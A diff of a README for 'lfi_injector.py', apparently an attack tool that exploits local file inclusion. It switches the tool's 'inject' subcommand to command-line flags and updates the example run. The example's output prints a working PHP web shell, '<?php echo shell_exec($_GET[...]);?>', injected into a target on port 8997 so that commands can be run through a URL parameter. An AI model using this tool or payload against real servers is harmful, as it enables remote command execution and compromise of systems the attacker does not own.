@@ -7,10 +7,8 @@ Prerequisites: The system must be vulnerable to LFI and the appropriate suscepti
 ## Usage
 
 ```
-usage: lfi_injector.py [-h] -f FILE -u URL -p PARAMETER [-v] {inject} ...
-
-positional arguments:
-  {inject}              inject -h for details
+usage: lfi_injector.py [-h] -f FILE -u URL -p PARAMETER [-v] [--inject]
+                       [--target TARGET] [--port PORT]
 
 optional arguments:
   -h, --help            show this help message and exit
@@ -19,25 +17,15 @@ optional arguments:
   -p PARAMETER, --parameter PARAMETER
                         injected parameter (ex: cmd)
   -v, --verbose         v: increased detail; vv: even more detail
-  ```
-  
-  ### inject
-  
-  ```
-  usage: lfi_injector.py inject [-h] [--port PORT] target
-
-positional arguments:
-  target       target to inject parser
-
-optional arguments:
-  -h, --help   show this help message and exit
-  --port PORT  port to inject (default: 80)
+  --inject              inject php parse code
+  --target TARGET       target to inject parser
+  --port PORT           port to inject (default: 80)
   ```
   
   ## Example
   
   ```
-python .\lfi_injector.py -f testfile -u http://127.0.0.1:8997?name=shrek -p t3st -v inject 127.0.0.1 --port=8997
+python .\lfi_injector.py -f testfile -u http://127.0.0.1:8997?name=shrek -p t3st -v --inject --target=127.0.0.1 --port=8997
 [+] inject php parameter parser enabled
 [+] connecting to 127.0.0.1 on port 8997
 [+] injecting: <?php echo shell_exec($_GET['t3st']);?>
